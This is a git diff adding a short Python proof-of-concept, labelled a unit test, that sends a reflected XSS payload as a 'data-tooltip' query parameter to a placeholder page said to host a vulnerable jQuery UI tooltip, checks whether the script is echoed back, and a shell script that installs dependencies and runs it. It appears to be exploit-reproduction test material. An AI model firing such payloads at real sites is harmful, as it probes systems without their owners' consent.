
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 000000000..31154a8dd
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,21 @@
+import requests
+from bs4 import BeautifulSoup
+
+# URL where the vulnerable jQuery UI tooltip widget is hosted
+url = "http://example.com/vulnerable_page"
+
+# Malicious script to be injected
+malicious_script = '<script>alert("XSS Exploit Successful");</script>'
+
+# Payload that exploits the XSS by injecting the malicious script in the title attribute
+payload = {"data-tooltip": malicious_script}
+
+# Send a GET request with the payload
+response = requests.get(url, params=payload)
+
+# Use BeautifulSoup to parse the response and check if the malicious script was injected successfully
+soup = BeautifulSoup(response.text, 'html.parser')
+if malicious_script in str(soup):
+    print("The ACI exploit success!!!")
+else:
+    print("The ACI exploit failed!!!")
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100644
index 000000000..4acfe4d66
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+# Ensure Python3 and pip are available
+echo "Checking for Python3..."
+command -v python3 &>/dev/null || { echo "Python3 is not installed. Please install Python3."; exit 1; }
+
+echo "Checking for pip..."
+command -v pip &>/dev/null || { echo "pip is not installed. Please install pip."; exit 1; }
+
+# Install necessary Python packages
+echo "Installing necessary Python packages..."
+pip install requests beautifulsoup4
+
+# Run the Python script to test for the CVE exploit
+echo "Running the ACI_unit_test.py script..."
+python3 ACI_unit_test.py
+
